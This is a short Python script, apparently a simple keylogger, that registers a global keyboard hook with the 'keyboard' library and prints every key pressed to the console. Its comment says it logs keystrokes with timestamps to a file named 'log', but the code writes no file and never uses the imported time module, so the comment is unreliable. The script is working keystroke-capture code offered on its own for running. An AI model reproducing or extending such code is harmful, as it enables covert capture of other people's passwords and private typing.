import keyboard as kb
import time

# keylog function records all the keystrokes along with the time at which they were recorded in a text file named log.
def keylog():
 
  # Define a callback function to handle keyboard events
  def on_press(key):
    if key.name == 'enter':
      print('')
      return
    if key.name == 'space':
      print(' ', end='', flush=True)
      return
    print(key.name, end='', flush=True)
  
  # Register the on_press function as a callback for keyboard events
  kb.on_press(on_press)
  # Wait for keyboard events to occur
  kb.wait()
 
# Call the keylog function to start logging keystrokes
keylog()